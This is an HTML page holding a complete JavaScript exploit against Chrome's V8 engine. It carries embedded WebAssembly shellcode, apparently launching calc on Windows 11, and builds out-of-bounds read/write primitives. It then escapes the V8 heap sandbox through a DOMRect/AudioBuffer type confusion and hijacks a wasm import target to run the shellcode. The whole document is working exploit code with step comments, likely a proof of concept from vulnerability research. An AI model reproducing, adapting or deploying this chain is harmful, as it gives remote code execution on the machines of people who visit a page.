<html>
<body>
  <script>

const importObject = {
  imports: { imported_func : Math.sin},
};
//Shellcode tested on Win11 23H2 10.0.22631.4037
var wasmBuffer = new Uint8Array([0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,0x01,0x10,0x03,0x50,0x00,0x5e,0x7c,0x01,0x60,0x01,0x7c,0x01,0x7c,0x60,0x00,0x01,0x63,0x00,0x02,0x19,0x01,0x07,0x69,0x6d,0x70,0x6f,0x72,0x74,0x73,0x0d,0x69,0x6d,0x70,0x6f,0x72,0x74,0x65,0x64,0x5f,0x66,0x75,0x6e,0x63,0x00,0x01,0x03,0x03,0x02,0x01,0x02,0x07,0x15,0x02,0x04,0x6d,0x61,0x69,0x6e,0x00,0x01,0x0a,0x6d,0x61,0x6b,0x65,0x5f,0x61,0x72,0x72,0x61,0x79,0x00,0x02,0x0a,0x88,0x02,0x02,0x06,0x00,0x20,0x00,0x10,0x00,0x0b,0xfe,0x01,0x01,0x01,0x63,0x00,0x41,0x12,0xfb,0x07,0x00,0x21,0x00,0x20,0x00,0x41,0x00,0x44,0x90,0x49,0x83,0xc4,0x60,0x90,0xeb,0x1d,0xfb,0x0e,0x00,0x20,0x00,0x41,0x01,0x44,0x65,0x4d,0x8b,0x04,0x24,0x90,0xeb,0x20,0xfb,0x0e,0x00,0x20,0x00,0x41,0x02,0x44,0x49,0x8b,0x78,0x18,0x90,0x90,0xeb,0x20,0xfb,0x0e,0x00,0x20,0x00,0x41,0x03,0x44,0x48,0x8b,0x7f,0x30,0x90,0x90,0xeb,0x20,0xfb,0x0e,0x00,0x20,0x00,0x41,0x04,0x44,0x48,0x8b,0x3f,0x48,0x8b,0x3f,0xeb,0x20,0xfb,0x0e,0x00,0x20,0x00,0x41,0x05,0x44,0x90,0x48,0x8b,0x47,0x10,0x90,0xeb,0x20,0xfb,0x0e,0x00,0x20,0x00,0x41,0x06,0x44,0x48,0x05,0x00,0x86,0x06,0x00,0xeb,0x20,0xfb,0x0e,0x00,0x20,0x00,0x41,0x07,0x44,0x48,0x31,0xc9,0x51,0x90,0x90,0xeb,0x20,0xfb,0x0e,0x00,0x20,0x00,0x41,0x08,0x44,0x68,0x63,0x61,0x6c,0x63,0x90,0xeb,0x20,0xfb,0x0e,0x00,0x20,0x00,0x41,0x09,0x44,0x48,0x31,0xd2,0x48,0xff,0xc2,0xeb,0x20,0xfb,0x0e,0x00,0x20,0x00,0x41,0x0a,0x44,0x48,0x89,0xe1,0x90,0x90,0x90,0xeb,0x20,0xfb,0x0e,0x00,0x20,0x00,0x41,0x0b,0x44,0x48,0x83,0xec,0x20,0x51,0x90,0xeb,0x20,0xfb,0x0e,0x00,0x20,0x00,0x41,0x0c,0x44,0xff,0xd0,0x90,0x90,0x90,0x90,0xeb,0x20,0xfb,0x0e,0x00,0x20,0x00,0x41,0x0d,0x44,0x90,0x90,0x90,0x90,0x90,0x90,0xeb,0x20,0xfb,0x0e,0x00,0x20,0x00,0x41,0x0e,0x44,0x90,0x90,0x90,0x90,0x90,0x90,0xeb,0x20,0xfb,0x0e,0x00,0x20,0x00,0x0b,0x00,0x1a,0x04,0x6e,0x61,0x6d,0x65,0x01,0x13,0x02,0x01,0x04,0x6d,0x61,0x69,0x6e,0x02,0x0a,0x6d,0x61,0x6b,0x65,0x5f,0x61,0x72,0x72,0x61,0x79]);

var module = new WebAssembly.Module(wasmBuffer);
var instance = new WebAssembly.Instance(module, importObject);
var func = instance.exports.make_array;
func();

var view = new ArrayBuffer(24);
var dblArr = new Float64Array(view);
var intView = new Uint32Array(view);
var bigIntView = new BigInt64Array(view);

function ftoi32(f) {
    dblArr[0] = f;
    return [intView[0], intView[1]];
}

function i32tof(i1, i2) {
    intView[0] = i1;
    intView[1] = i2;
    return dblArr[0];
}

function itof(i) {
    bigIntView = BigInt(i);
    return dblArr[0];
}

function ftoi(f) {
    dblArr[0] = f;
    return bigIntView[0];
}


function addrOf(obj) {
  oobObjArr[0] = obj;
  var addrDbl = corrupted_arr[9];
  return ftoi32(addrDbl)[0];
}

function read(addr) {
  var old_value = corrupted_arr[oobOffset];
  corrupted_arr[oobOffset] = i32tof(addr,2);
  var oldAddr = ftoi32(old_value);
  var out = ftoi32(oobDblArr[0]);
  corrupted_arr[oobOffset] = old_value;
  return out;
}

function write(addr, val1, val2) {
  var old_value = corrupted_arr[oobOffset];
  corrupted_arr[oobOffset] = i32tof(addr,2);
  oobDblArr[0] = i32tof(val1, val2);
  corrupted_arr[oobOffset] = old_value;
  return;
}

var num = 3;
var nameAddr = 0xdc5;  // <<<<<<<<< check this
var dblArrMap = 0x255159;
var objArrMap = 0x2551d9; 

var nameAddrF = i32tof(nameAddr, nameAddr);
var fakeDblArray = [1.1,2.2];
var oobDblArr = [2.2];
var oobObjArr = [view];
oobObjArr[0] = 0x4242;

var fakeDblArrayAddr = 0x4881d  

var fakeDblArrayEle = fakeDblArrayAddr - 0x18;
fakeDblArray[0] = i32tof(dblArrMap, 0x725);
fakeDblArray[1] = i32tof(fakeDblArrayEle, 0x100);


var x = {};
for (let i = 0; i < num; i++) {
  x['a' + i] = 1;
}
var x1 = {};
for (let i = 0; i < num; i++) {
  x1['a' + i] = 1;
}
x1.prop = 1;
x.__defineGetter__("prop", function() {
  let obj = {};
  obj.a0 = 1.5;
  for (let i = 0; i < 1024 + 512; i++) {
    let tmp = {};
    tmp.a0 = 1;
    for (let j = 1; j < num; j++) {
      tmp['a' + j] = 1;
    }
    tmp['p' + i] = 1;
  }
  return 4;
});
x.z = 1;
delete x.z;
var y = {...x};

var arr = new Array(256);
for (let i = 0; i < 7; i++) {
  arr[i] = new Array(256);
  for (let j = 0; j < arr[i].length; j++) {
    arr[i][j] = nameAddrF;
  }
}

for (let j = 0; j < 7; j++) {
  let a = arr[j];
  for (let i = 0; i < 256; i++) {
    a[i] = i32tof(nameAddr, fakeDblArrayEle + 0x8);//i32tof(fakeDblArrayEle + 0xc, nameAddr);
  }
}

var z = {};
z.__proto__ = y;
z.p = 1;
z.p;

var oobOffset = 7;

// 0:000> ? chrome!v8::internal::TrustedCage::base_ - chrome!blink::V8DOMRectReadOnly::wrapper_type_info_
// Evaluate expression: 3265256 = 00000000`0031d2e8
var trustedOffset = 0x31d2e8; // OK

var corrupted_arr = y.name;

function getInstance(obj) {
  let addr = addrOf(obj);
  return read(addr + 0x10);
}
//v8 heap sandbox escape
//Math.sin();
var domRect = new DOMRect(1.1,2.3,3.3,4.4);
var node = new AudioBuffer({length: 3000, sampleRate: 30000, numberOfChannels : 2});
var channel = node.getChannelData(0);
var nodeInstance = getInstance(node);
var channelAddr = addrOf(channel);
var channelInstance = read(channelAddr + 0x3c);
var rectAddr = addrOf(domRect);
var read1 = addrOf(fakeDblArray)
//alert("0x" + read1.toString(16))
var rectInstance = read(rectAddr + 0x10);
var rectType = read(rectAddr + 0x8);

write(rectAddr + 0x10, rectType[0], rectType[1]);
//V8DOMRectReadOnly18wrapper_type_info_E
var typeInfo = ftoi32(domRect.width);
//Confusion between DOMRect and DOMArrayBuffer allows raw_base_addr_ ptr to be overwritten, causing arbitrary rw
write(rectAddr + 0x10, channelInstance[0], channelInstance[1]);
var rawBase = ftoi32(domRect.x);
var trustedBase = i32tof(typeInfo[0] + trustedOffset, typeInfo[1]); // OK up to here
var read3 = addrOf(trustedBase);
//Set address to read and write
domRect.x = trustedBase;
var dst = new Float32Array(view);
//copyFromChannel and copyToChannel can then be used for arbitrary rw
node.copyFromChannel(dst, 0, 0);
//dispatch_table_from_imports address
var trustedCage = intView[1];

function findImportTarget(startAddr) {
  var dispatchMap = 0x1f8d;
  var dstBuffer = new ArrayBuffer(0x1000);
  var dstFloat = new Float32Array(dstBuffer);
  var dstInt = new Uint32Array(dstBuffer);
  domRect.x = i32tof(startAddr, trustedCage);
  node.copyFromChannel(dstFloat, 0, 0);
  for (let i = 0; i < dstInt.length; i++) {
    if (dstInt[i] === 0x1f8d) {  
      return i;
    }
  }
  return -1;
}
var startAddr = 0x40600;

var codeIdx = findImportTarget(startAddr);
if (codeIdx != -1) {
  var exported = instance.exports.main;
  var code = i32tof(startAddr + codeIdx * 4 + 0xc, trustedCage);
  domRect.x = code;
  node.copyFromChannel(dst, 0, 0);
  intView[0] = intView[0] + 0xe + 0x100;
  node.copyToChannel(dst, 0, 0);
  intView[0] = 0;
  node.copyFromChannel(dst,0,0);
  exported();
  exported();
}
</script>
</body>
</html>


